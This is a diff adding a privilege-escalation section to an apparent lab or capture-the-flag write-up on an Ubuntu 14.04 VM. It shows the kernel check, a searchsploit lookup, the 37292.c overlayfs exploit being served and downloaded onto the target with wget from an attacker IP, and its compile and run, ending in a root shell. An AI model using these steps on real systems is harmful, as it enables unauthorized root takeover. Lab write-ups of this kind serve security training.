@@ -299,7 +299,92 @@ www-data@ubuntu:/usr/lib/cgi-bin$
 
 ```
 now we have a initial access good job
+so this time is a privledge esclation
+i used a kernal exploit vector for privilede esclation and 
 
+```bash
+www-data@ubuntu:/tmp$ hostnamectl
+hostnamectl
+   Static hostname: ubuntu
+         Icon name: computer-vm
+           Chassis: vm
+           Boot ID: 9cac0573c2eb45fcb4885efea5871095
+  Operating System: Ubuntu 14.04.1 LTS
+            Kernel: Linux 3.13.0-32-generic
+      Architecture: x86_64
+www-data@ubuntu:/tmp$ 
 
+```
+search for known exploit in searchsploit database:
+```bash
+mrbunny $ searchsploit 3.13.0-32 ubuntu
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                                              |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                        | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                   | linux/local/37293.txt
+Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                      | linux_x86-64/local/31347.c
+Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                                             | linux/local/31346.c
+Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                        | linux/dos/43234.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                               | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                      | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                           | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                       | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                   | linux/local/47169.c
+Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                      | linux/local/41760.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------ 
+```
+it's listed some kernal exploit i choose 1st exploit and 
+localtion in my parrot machin of payload is:/usr/share/exploitdb/exploits/linux/local/37292.c 
+transfer it on target machine 
+
+```bash
+mrbunny $ pwd
+/usr/share/exploitdb/exploits/linux/local/37292.c
+mrbunny $ python -m http.server 5656
+Serving HTTP on 0.0.0.0 port 5656 (http://0.0.0.0:5656/) ...
+
+```
+```bash
+www-data@ubuntu:/tmp$ wget http://192.168.226.188:5656/37292.c
+wget http://192.168.226.188:5656/37292.c
+--2026-01-04 23:22:13--  http://192.168.226.188:5656/37292.c
+Connecting to 192.168.226.188:5656... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4968 (4.9K) [text/x-csrc]
+Saving to: '37292.c'
+
+     0K ....                                                  100% 2.74M=0.002s
+
+2026-01-04 23:22:13 (2.74 MB/s) - '37292.c' saved [4968/4968]
+
+www-data@ubuntu:/tmp$ ls
+ls
+37292.c
+exploit
+kernal_exploit
+linpeas.sh
+www-data@ubuntu:/tmp$ chmod u+x 37292.c
+chmod u+x 37292.c
+www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+bin:/sbin:/binsr/local/sbin:/usr/local/bin:/usr/sbin:/usr/ 
+www-data@ubuntu:/tmp$ 
+
+www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
+gcc 37292.c -o exploit
+www-data@ubuntu:/tmp$ ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# 
+
+```
 
 
